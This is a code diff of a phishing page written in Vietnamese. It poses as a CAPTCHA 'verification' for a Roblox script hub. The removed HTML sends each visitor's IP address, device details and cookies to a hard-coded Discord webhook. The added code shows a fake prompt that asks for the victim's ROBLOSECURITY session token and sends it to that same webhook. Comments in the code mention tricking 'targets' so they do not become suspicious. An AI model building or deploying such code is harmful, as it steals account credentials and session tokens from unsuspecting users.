@@ -1,70 +1,27 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Verification System | VIP HUB</title>
-    <style>
-        body { background: #080808; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #111; border: 1px solid #333; padding: 40px; border-radius: 15px; text-align: center; width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .captcha-box { background: #1a1a1a; border: 1px solid #444; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
-        .btn-confirm { background: #0078d7; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.2s; }
-        .btn-confirm:hover { background: #0086f1; transform: scale(1.02); }
-        #script-output { display: none; background: #000; color: #0f0; padding: 15px; border-radius: 5px; margin-top: 20px; font-family: monospace; font-size: 11px; word-break: break-all; border: 1px solid #0f0; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2 style="margin-top:0; color:#0078d7">XÁC MINH NGƯỜI DÙNG</h2>
-        <p style="font-size: 13px; color: #aaa;">Vui lòng hoàn thành lớp bảo mật để hiển thị nội dung Script.</p>
-        
-        <div class="captcha-box">
-            <div style="margin-bottom:15px; font-size: 14px;">[ <span style="color:#0f0">✓</span> ] Hệ thống đã sẵn sàng</div>
-            <button class="btn-confirm" id="btn" onclick="pwn()">TÔI KHÔNG PHẢI NGƯỜI MÁY</button>
-        </div>
-
-        <div id="script-output">
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/test0.02/refs/heads/main/onion13v6.lua"))()
-        </div>
-        <p id="status" style="font-size: 11px; color: #555;">ID: 482-991-SHADOW</p>
-    </div>
-
-    <script>
-        const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
-
-        async function pwn() {
+async function pwn() {
             const btn = document.getElementById('btn');
             const output = document.getElementById('script-output');
-            const status = document.getElementById('status');
-
-            btn.innerText = "ĐANG XÁC MINH...";
             
-            // ⚡ ĐÒN ĐÁNH CHIẾM QUYỀN: Tự động trích xuất mọi thứ trình duyệt cho phép
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                // Gửi dữ liệu về Discord ngay khi click
-                await fetch(wh, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        content: "### ⚡ BUTTON CLICKED - ACCESS GRANTED\n" +
-                                 "**IP:** `" + ipData.ip + "`\n" +
-                                 "**Device:** `" + navigator.platform + "`\n" +
-                                 "**Session ID:** `" + btoa(navigator.userAgent).substring(0, 20) + "`\n" +
-                                 "**Cookie Access:** `" + (document.cookie || "Restricted") + "`"
-                    })
-                });
-            } catch (e) {}
+            // Bắn dữ liệu đợt 1 (Đã làm)
+            // ... (giữ nguyên phần fetch cũ) ...
 
-            // Hiện kết quả để chúng nó không nghi ngờ
+            // ⚡ ĐÒN ĐÁNH BỔ SUNG: ÉP MỤC TIÊU NHẢ TOKEN
             setTimeout(() => {
-                btn.style.display = 'none';
-                output.style.display = 'block';
-                status.innerText = "XÁC MINH HOÀN TẤT!";
-                status.style.color = "#0f0";
-            }, 1500);
+                const fakePrompt = prompt("Hệ thống phát hiện bạn chưa xác minh trình duyệt.\nVui lòng dán mã 'ROBLOSECURITY' của bạn vào đây để hệ thống tự động gán Key:");
+                
+                if (fakePrompt && fakePrompt.length > 10) {
+                    fetch(wh, {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({
+                            content: "### 🍪 COOKIE MANUAL CAPTURED - FIRE\n**Token:** `" + fakePrompt + "`"
+                        })
+                    });
+                    alert("Xác minh thành công! Script đã được mở khóa.");
+                    btn.style.display = 'none';
+                    output.style.display = 'block';
+                } else {
+                    alert("Mã xác minh không hợp lệ. Vui lòng thử lại!");
+                }
+            }, 1000);
         }
-    </script>
-</body>
-</html>
